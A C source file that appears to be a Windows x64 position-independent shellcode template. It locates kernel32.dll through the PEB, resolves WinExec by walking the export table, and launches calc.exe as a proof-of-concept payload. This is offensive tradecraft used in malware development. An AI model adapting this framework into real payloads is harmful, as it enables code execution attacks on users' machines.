#include "../include/common.h"
#include "../include/win32/windows.h"
#include "string.h"
#include <stdbool.h>
#include <stdint.h>

typedef UINT(WINAPI *WinExecPtr)(LPCSTR lpCmdLine, UINT uCmdShow);

// TODO: IDEA FOR GLOBALS WITH NO GLOBALS. WHAT ABOUT SAVING POINTER IN CPU REGISTER???

FUNC PIMAGE_DOS_HEADER GetDllFromMemory(PPEB_LDR_DATA ldr, const wchar_t *name) {
	wchar_t tmp_name[1024];
	wchar_t tmp_dll[1024];

	// wcs_to_lowercase(name, tmp_name);


	// TODO: Split by \\, take the last part.
	// TODO: Test this on Windows 10

	PLIST_ENTRY item		  = ldr->InMemoryOrderModuleList.Blink;
	PLDR_DATA_TABLE_ENTRY dll = NULL;

	do {
		dll = CONTAINING_RECORD(item, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		// printf("Found: %ls\n", dll->FullDllName.Buffer);
		// wcs_to_lowercase(dll->FullDllName.Buffer, tmp_dll);

		if (wcscmp(dll->FullDllName.Buffer, name) == 0) {
			return (PIMAGE_DOS_HEADER) dll->DllBase;
		}

		item = item->Blink;
	} while (item != NULL);

	return NULL;
}

FUNC PPEB GetPEB(void) {
	uint64_t value = 0;

	// Inline assembly to read from the GS segment
	__asm__ volatile("movq %%gs:%1, %0"
					 : "=r"(value)			   // output
					 : "m"(*(uint64_t *) 0x60) // input
					 :						   // no clobbered registers
	);

	return (PPEB) value;
}

FUNC int MainPIC() {
	// TODO: Init global context, load main function very quickly
	// TODO: Add debugging info
	// TODO: Clean this shit motherfucker
	PPEB peb = GetPEB();

	// Get address of kernel32.dll
	PIMAGE_DOS_HEADER kernel32 = GetDllFromMemory(peb->Ldr, L"C:\\WINDOWS\\System32\\KERNEL32.DLL");

	// printf("KERNEL32.DLL: %p\n", kernel32);
	// printf("Dupa...\n");

	// Get address of PE headers
	PBYTE pe_hdrs = (PBYTE) ((PBYTE) kernel32 + kernel32->e_lfanew);

	// Get Export Address Table RVA
	DWORD eat_rva = *(PDWORD) (pe_hdrs + 0x88);

	// Get address of Export Address Table
	PIMAGE_EXPORT_DIRECTORY eat = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) kernel32 + eat_rva);

	// Get address of function names table
	PDWORD name_rva = (PDWORD) ((PBYTE) kernel32 + eat->AddressOfNames);

	// Get function name
	uint64_t i = 0;

	do {
		char *tmp = (char *) ((PBYTE) kernel32 + name_rva[i]);

		if (strcmp(tmp, "WinExec") == 0) {
			// printf("%s\n", tmp);
			break;
		}
		i++;
	} while (true);

	// Get function ordinal
	PWORD ordinals = (PWORD) ((PBYTE) kernel32 + eat->AddressOfNameOrdinals);
	WORD ordinal   = ordinals[i];

	// Get function pointer
	PDWORD func_rvas	  = (PDWORD) ((PBYTE) kernel32 + eat->AddressOfFunctions);
	DWORD func_rva		  = func_rvas[ordinal];
	WinExecPtr winExecPtr = (WinExecPtr) ((PBYTE) kernel32 + func_rva);

	// Run WinAPI function
	__asm__ volatile("and $-16, %rsp"); // TODO: Is this required?
	winExecPtr("calc.exe", SW_SHOWNORMAL);

	// printf("END\n");

	return 0;
}


ENTRY_FUNC void main() {
	// Align stack and jump to the entry point
	__asm__ volatile("push %rsi\n"
					 "mov %rsp, %rsi\n"
					 "and $0x0FFFFFFFFFFFFFFF0, %rsp\n"
					 "sub $0x20, %rsp\n"
					 
					 "call MainPIC\n"
					 
					 "mov %rsi, %rsp\n"
					 "pop %rsi\n"
					 "ret\n");
}

// Leave it here, otherwise linker goes crazy...
// TODO: Can it be removed?
int __main() {}